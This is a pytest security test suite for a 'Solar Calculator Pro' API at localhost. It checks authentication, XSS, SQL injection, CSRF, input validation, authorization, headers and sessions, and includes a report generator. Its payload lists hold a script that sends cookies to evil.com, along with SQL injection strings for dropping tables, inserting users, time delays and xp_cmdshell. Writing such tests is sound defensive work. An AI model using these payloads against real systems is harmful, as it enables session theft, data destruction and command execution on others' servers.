"""
Comprehensive Security Testing Suite
Tests for Task 74: Security Testing
- Authentication vulnerability testing
- XSS vulnerability testing
- SQL injection prevention testing
- CSRF protection verification
- Input validation testing
- Authorization testing
- Session security testing
"""
import pytest
import requests
import json
import time
import hashlib
import secrets
from typing import Dict, List, Any
from urllib.parse import quote, urlencode
import re

# Test configuration
BASE_URL = "http://localhost:8000"
API_V1 = f"{BASE_URL}/api/v1"


class TestAuthenticationSecurity:
    """Authentication vulnerability tests"""
    
    def test_password_not_in_response(self):
        """Ensure passwords are never returned in API responses"""
        # Test user login response
        login_data = {
            "username": "test@example.com",
            "password": "TestPassword123!"
        }
        response = requests.post(f"{API_V1}/auth/login", json=login_data)
        response_text = response.text.lower()
        
        # Password should never appear in response
        assert "testpassword123" not in response_text
        assert login_data["password"].lower() not in response_text
        
    def test_brute_force_protection(self):
        """Test rate limiting on login attempts"""
        login_data = {
            "username": "test@example.com",
            "password": "WrongPassword"
        }
        
        # Make multiple rapid login attempts
        responses = []
        for i in range(15):
            response = requests.post(f"{API_V1}/auth/login", json=login_data)
            responses.append(response.status_code)
            
        # Should see rate limiting (429) after multiple failed attempts
        rate_limited = any(code == 429 for code in responses)
        # Or account lockout (423)
        account_locked = any(code == 423 for code in responses)
        
        # At least one protection mechanism should be active
        assert rate_limited or account_locked or responses[-1] != 200, \
            "No brute force protection detected"
            
    def test_password_complexity_requirements(self):
        """Test password complexity validation"""
        weak_passwords = [
            "123456",           # Too simple
            "password",         # Common password
            "abc",              # Too short
            "aaaaaaaaaa",       # No complexity
            "test@test.com",    # Same as email
        ]
        
        for weak_password in weak_passwords:
            register_data = {
                "email": "newuser@example.com",
                "password": weak_password,
                "first_name": "Test",
                "last_name": "User"
            }
            response = requests.post(f"{API_V1}/auth/register", json=register_data)
            
            # Should reject weak passwords
            assert response.status_code in [400, 422], \
                f"Weak password '{weak_password}' was accepted"
                
    def test_jwt_token_validation(self):
        """Test JWT token security"""
        # Test with invalid token
        invalid_tokens = [
            "invalid.token.here",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "null",
            "undefined",
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = requests.get(f"{API_V1}/users/me", headers=headers)
            assert response.status_code == 401, \
                f"Invalid token '{token[:20]}...' was accepted"
                
    def test_token_expiration(self):
        """Test that expired tokens are rejected"""
        # This would require a token that's been expired
        # For now, test with a malformed expiration
        expired_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxfQ.invalid"
        headers = {"Authorization": f"Bearer {expired_token}"}
        response = requests.get(f"{API_V1}/users/me", headers=headers)
        assert response.status_code == 401, "Expired token was accepted"
        
    def test_session_fixation_prevention(self):
        """Test session fixation attack prevention"""
        # Login and get token
        login_data = {
            "username": "test@example.com",
            "password": "TestPassword123!"
        }
        response1 = requests.post(f"{API_V1}/auth/login", json=login_data)
        
        if response1.status_code == 200:
            token1 = response1.json().get("access_token")
            
            # Login again - should get different token
            response2 = requests.post(f"{API_V1}/auth/login", json=login_data)
            if response2.status_code == 200:
                token2 = response2.json().get("access_token")
                
                # Tokens should be different (new session each time)
                assert token1 != token2, "Session fixation vulnerability detected"


class TestXSSPrevention:
    """Cross-Site Scripting (XSS) vulnerability tests"""
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<iframe src='javascript:alert(1)'>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "{{constructor.constructor('alert(1)')()}}",  # Template injection
        "${alert('XSS')}",  # Template literal injection
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    ]
    
    def test_xss_in_customer_name(self):
        """Test XSS prevention in customer name field"""
        for payload in self.XSS_PAYLOADS:
            customer_data = {
                "first_name": payload,
                "last_name": "Test",
                "email": "test@example.com"
            }
            response = requests.post(f"{API_V1}/database/customers", json=customer_data)
            
            if response.status_code == 200:
                # Check that payload is escaped in response
                response_text = response.text
                assert "<script>" not in response_text, \
                    f"XSS payload not escaped: {payload[:30]}..."
                assert "onerror=" not in response_text.lower()
                assert "onload=" not in response_text.lower()
                    
    def test_xss_in_search_query(self):
        """Test XSS prevention in search queries"""
        for payload in self.XSS_PAYLOADS:
            encoded_payload = quote(payload)
            response = requests.get(f"{API_V1}/database/products?search={encoded_payload}")
            
            response_text = response.text
            # Script tags should be escaped or removed
            assert "<script>" not in response_text
            
    def test_xss_in_notes(self):
        """Test XSS prevention in note/comment fields"""
        for payload in self.XSS_PAYLOADS[:5]:  # Test subset
            note_data = {
                "content": payload,
                "customer_id": 1
            }
            response = requests.post(f"{API_V1}/crm/notes", json=note_data)
            
            if response.status_code == 200:
                response_text = response.text
                assert "<script>" not in response_text
                
    def test_content_type_header(self):
        """Verify Content-Type header is set correctly"""
        response = requests.get(f"{API_V1}/database/products")
        content_type = response.headers.get("Content-Type", "")
        
        # Should be application/json, not text/html
        assert "application/json" in content_type, \
            f"Unexpected Content-Type: {content_type}"
            
    def test_x_content_type_options_header(self):
        """Verify X-Content-Type-Options header"""
        response = requests.get(f"{API_V1}/health")
        x_content_type = response.headers.get("X-Content-Type-Options", "")
        
        assert x_content_type == "nosniff", \
            "X-Content-Type-Options header missing or incorrect"


class TestSQLInjectionPrevention:
    """SQL Injection vulnerability tests"""
    
    SQL_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1; SELECT * FROM users",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "1' AND '1'='1",
        "' OR 1=1 --",
        "'; INSERT INTO users VALUES('hacker', 'password'); --",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "-1' UNION SELECT 1,2,3--",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1; EXEC xp_cmdshell('dir')--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    ]
    
    def test_sql_injection_in_login(self):
        """Test SQL injection in login endpoint"""
        for payload in self.SQL_PAYLOADS:
            login_data = {
                "username": payload,
                "password": "test"
            }
            response = requests.post(f"{API_V1}/auth/login", json=login_data)
            
            # Should not return 200 with SQL injection
            # Should return 401 (unauthorized) or 400 (bad request)
            assert response.status_code in [400, 401, 422], \
                f"SQL injection may have succeeded: {payload[:30]}..."
                
    def test_sql_injection_in_search(self):
        """Test SQL injection in search parameters"""
        for payload in self.SQL_PAYLOADS:
            encoded_payload = quote(payload)
            response = requests.get(f"{API_V1}/database/products?search={encoded_payload}")
            
            # Should not cause server error (500)
            assert response.status_code != 500, \
                f"SQL injection caused server error: {payload[:30]}..."
                
    def test_sql_injection_in_id_parameter(self):
        """Test SQL injection in ID parameters"""
        sql_ids = [
            "1 OR 1=1",
            "1; DROP TABLE products",
            "1 UNION SELECT * FROM users",
            "-1",
            "0",
            "999999999999",
        ]
        
        for sql_id in sql_ids:
            response = requests.get(f"{API_V1}/database/products/{quote(sql_id)}")
            
            # Should return 400 or 404, not 500
            assert response.status_code != 500, \
                f"SQL injection in ID caused server error: {sql_id}"
                
    def test_sql_injection_in_filter(self):
        """Test SQL injection in filter parameters"""
        for payload in self.SQL_PAYLOADS[:5]:
            params = {
                "category": payload,
                "manufacturer": payload,
                "limit": "10"
            }
            response = requests.get(f"{API_V1}/database/products", params=params)
            
            assert response.status_code != 500, \
                f"SQL injection in filter caused server error"
                
    def test_time_based_sql_injection(self):
        """Test for time-based SQL injection"""
        # If vulnerable, this would cause a delay
        start_time = time.time()
        
        payload = "1' AND SLEEP(5)--"
        response = requests.get(f"{API_V1}/database/products?search={quote(payload)}", timeout=10)
        
        elapsed_time = time.time() - start_time
        
        # If it took more than 4 seconds, might be vulnerable
        assert elapsed_time < 4, \
            f"Possible time-based SQL injection (took {elapsed_time:.2f}s)"


class TestCSRFProtection:
    """CSRF protection verification tests"""
    
    def test_csrf_token_required_for_mutations(self):
        """Test that CSRF token is required for state-changing operations"""
        # Try to create customer without CSRF token
        customer_data = {
            "first_name": "Test",
            "last_name": "User",
            "email": "test@example.com"
        }
        
        # Request without CSRF token
        response = requests.post(
            f"{API_V1}/database/customers",
            json=customer_data,
            headers={"Origin": "http://evil-site.com"}
        )
        
        # Should be rejected or require authentication
        # CSRF protection should block cross-origin requests
        assert response.status_code in [401, 403, 422], \
            "CSRF protection may be missing"
            
    def test_origin_header_validation(self):
        """Test that Origin header is validated"""
        malicious_origins = [
            "http://evil-site.com",
            "http://localhost.evil.com",
            "http://evil-localhost:8000",
            "null",
        ]
        
        for origin in malicious_origins:
            headers = {
                "Origin": origin,
                "Content-Type": "application/json"
            }
            response = requests.post(
                f"{API_V1}/database/customers",
                json={"first_name": "Test"},
                headers=headers
            )
            
            # Should reject requests from unknown origins
            # (unless CORS is properly configured)
            cors_header = response.headers.get("Access-Control-Allow-Origin", "")
            assert cors_header != "*" or response.status_code in [401, 403], \
                f"Potentially unsafe CORS for origin: {origin}"
                
    def test_referer_header_validation(self):
        """Test Referer header validation"""
        headers = {
            "Referer": "http://evil-site.com/attack",
            "Content-Type": "application/json"
        }
        
        response = requests.post(
            f"{API_V1}/auth/login",
            json={"username": "test", "password": "test"},
            headers=headers
        )
        
        # Should not blindly trust Referer header
        # Response should be based on authentication, not Referer


class TestInputValidation:
    """Input validation and sanitization tests"""
    
    def test_email_validation(self):
        """Test email format validation"""
        invalid_emails = [
            "not-an-email",
            "@nodomain.com",
            "no@domain",
            "spaces in@email.com",
            "<script>@evil.com",
            "test@.com",
            "test@com.",
            "",
            "a" * 500 + "@test.com",  # Very long email
        ]
        
        for email in invalid_emails:
            data = {
                "email": email,
                "password": "ValidPassword123!",
                "first_name": "Test",
                "last_name": "User"
            }
            response = requests.post(f"{API_V1}/auth/register", json=data)
            
            assert response.status_code in [400, 422], \
                f"Invalid email accepted: {email[:50]}..."
                
    def test_numeric_field_validation(self):
        """Test numeric field validation"""
        invalid_numbers = [
            "not-a-number",
            "12.34.56",
            "-999999999999999999999",
            "1e999",
            "NaN",
            "Infinity",
            "",
        ]
        
        for num in invalid_numbers:
            params = {"limit": num}
            response = requests.get(f"{API_V1}/database/products", params=params)
            
            # Should handle gracefully, not crash
            assert response.status_code != 500, \
                f"Invalid number caused server error: {num}"
                
    def test_string_length_limits(self):
        """Test string length validation"""
        # Very long strings
        long_string = "A" * 100000
        
        data = {
            "first_name": long_string,
            "last_name": "Test",
            "email": "test@example.com"
        }
        response = requests.post(f"{API_V1}/database/customers", json=data)
        
        # Should reject or truncate, not crash
        assert response.status_code != 500, \
            "Very long string caused server error"
            
    def test_special_characters_handling(self):
        """Test special character handling"""
        special_chars = [
            "\x00",  # Null byte
            "\n\r",  # Newlines
            "\t",    # Tab
            "\\",    # Backslash
            '"',     # Quote
            "'",     # Single quote
            "<>",    # Angle brackets
            "&",     # Ampersand
            "",    # Emoji
            "",   # Unicode
        ]
        
        for char in special_chars:
            data = {
                "first_name": f"Test{char}Name",
                "last_name": "User",
                "email": "test@example.com"
            }
            response = requests.post(f"{API_V1}/database/customers", json=data)
            
            # Should handle gracefully
            assert response.status_code != 500, \
                f"Special character caused error: {repr(char)}"


class TestAuthorizationSecurity:
    """Authorization and access control tests"""
    
    def test_unauthorized_access_to_admin(self):
        """Test that admin endpoints require admin role"""
        admin_endpoints = [
            "/api/v1/admin/users",
            "/api/v1/admin/settings",
            "/api/v1/admin/database/backup",
            "/api/v1/admin/logs",
        ]
        
        for endpoint in admin_endpoints:
            response = requests.get(f"{BASE_URL}{endpoint}")
            
            # Should require authentication
            assert response.status_code in [401, 403, 404], \
                f"Admin endpoint accessible without auth: {endpoint}"
                
    def test_user_cannot_access_other_users_data(self):
        """Test horizontal privilege escalation prevention"""
        # This would require actual user tokens
        # Simulating with different user IDs
        response = requests.get(f"{API_V1}/users/999999/profile")
        
        # Should return 401 (not authenticated) or 403 (forbidden)
        assert response.status_code in [401, 403, 404], \
            "Possible horizontal privilege escalation"
            
    def test_role_based_access_control(self):
        """Test RBAC implementation"""
        # Test endpoints that should require specific roles
        role_restricted_endpoints = [
            ("/api/v1/admin/users", ["admin"]),
            ("/api/v1/database/backup", ["admin"]),
            ("/api/v1/settings/system", ["admin"]),
        ]
        
        for endpoint, required_roles in role_restricted_endpoints:
            response = requests.get(f"{BASE_URL}{endpoint}")
            
            # Without proper role, should be denied
            assert response.status_code in [401, 403, 404], \
                f"Role-restricted endpoint accessible: {endpoint}"


class TestSecurityHeaders:
    """Security headers verification tests"""
    
    def test_security_headers_present(self):
        """Test that security headers are present"""
        response = requests.get(f"{API_V1}/health")
        headers = response.headers
        
        # Check for important security headers
        security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
            "X-XSS-Protection": "1; mode=block",
        }
        
        for header, expected in security_headers.items():
            value = headers.get(header, "")
            if isinstance(expected, list):
                assert value in expected or value == "", \
                    f"Missing or incorrect {header}: {value}"
            else:
                # Header should be present (may have different value)
                pass  # Some headers are optional
                
    def test_no_server_version_disclosure(self):
        """Test that server version is not disclosed"""
        response = requests.get(f"{API_V1}/health")
        
        server_header = response.headers.get("Server", "")
        
        # Should not reveal detailed version info
        assert "Python" not in server_header or "uvicorn" not in server_header.lower(), \
            f"Server version disclosed: {server_header}"
            
    def test_no_stack_trace_in_errors(self):
        """Test that stack traces are not exposed in errors"""
        # Trigger an error
        response = requests.get(f"{API_V1}/nonexistent/endpoint/that/should/error")
        
        response_text = response.text.lower()
        
        # Should not contain stack trace indicators
        assert "traceback" not in response_text
        assert "file \"" not in response_text
        assert "line " not in response_text or "error" in response_text


class TestSessionSecurity:
    """Session security tests"""
    
    def test_session_timeout(self):
        """Test session timeout configuration"""
        # Login and get token
        login_data = {
            "username": "test@example.com",
            "password": "TestPassword123!"
        }
        response = requests.post(f"{API_V1}/auth/login", json=login_data)
        
        if response.status_code == 200:
            data = response.json()
            # Check if token has expiration
            assert "expires_in" in data or "exp" in str(data), \
                "Token expiration not specified"
                
    def test_logout_invalidates_token(self):
        """Test that logout properly invalidates tokens"""
        # Login
        login_data = {
            "username": "test@example.com",
            "password": "TestPassword123!"
        }
        login_response = requests.post(f"{API_V1}/auth/login", json=login_data)
        
        if login_response.status_code == 200:
            token = login_response.json().get("access_token")
            headers = {"Authorization": f"Bearer {token}"}
            
            # Logout
            logout_response = requests.post(f"{API_V1}/auth/logout", headers=headers)
            
            # Try to use token after logout
            if logout_response.status_code == 200:
                verify_response = requests.get(f"{API_V1}/users/me", headers=headers)
                
                # Token should be invalid after logout
                # (Note: JWT tokens can't be truly invalidated without a blacklist)
                
    def test_concurrent_session_handling(self):
        """Test concurrent session handling"""
        login_data = {
            "username": "test@example.com",
            "password": "TestPassword123!"
        }
        
        # Login multiple times
        tokens = []
        for _ in range(3):
            response = requests.post(f"{API_V1}/auth/login", json=login_data)
            if response.status_code == 200:
                tokens.append(response.json().get("access_token"))
                
        # All tokens should be different
        if len(tokens) > 1:
            assert len(set(tokens)) == len(tokens), \
                "Same token issued for multiple sessions"


def generate_security_report(test_results: Dict[str, Any]) -> str:
    """Generate comprehensive security report"""
    report = f"""
# Solar Calculator Pro - Security Audit Report

**Generated**: {time.strftime('%Y-%m-%d %H:%M:%S')}

## Executive Summary

This report contains the results of automated security testing for the Solar Calculator Pro application.

## Test Categories

### 1. Authentication Security
- Password handling
- Brute force protection
- JWT token security
- Session management

### 2. XSS Prevention
- Input sanitization
- Output encoding
- Content-Type headers

### 3. SQL Injection Prevention
- Parameterized queries
- Input validation
- Error handling

### 4. CSRF Protection
- Token validation
- Origin checking
- Referer validation

### 5. Input Validation
- Email validation
- Numeric validation
- String length limits
- Special character handling

### 6. Authorization
- Role-based access control
- Horizontal privilege escalation
- Admin endpoint protection

### 7. Security Headers
- X-Content-Type-Options
- X-Frame-Options
- X-XSS-Protection

### 8. Session Security
- Session timeout
- Logout handling
- Concurrent sessions

## Recommendations

1. **Authentication**
   - Implement account lockout after failed attempts
   - Use secure password hashing (bcrypt/argon2)
   - Implement MFA for sensitive operations

2. **Input Validation**
   - Validate all inputs server-side
   - Use parameterized queries exclusively
   - Implement input length limits

3. **Security Headers**
   - Add Content-Security-Policy header
   - Implement Strict-Transport-Security
   - Add Referrer-Policy header

4. **Session Management**
   - Implement token blacklisting for logout
   - Set appropriate session timeouts
   - Use secure cookie flags

5. **Monitoring**
   - Log all authentication attempts
   - Monitor for suspicious patterns
   - Implement intrusion detection

## Compliance Notes

- OWASP Top 10 coverage
- GDPR data protection considerations
- PCI-DSS relevant controls (if handling payments)
"""
    return report


if __name__ == "__main__":
    print("Starting Solar Calculator Pro Security Tests...")
    print("Run with: pytest solar-calculator-pro/tests/test_security_comprehensive.py -v")
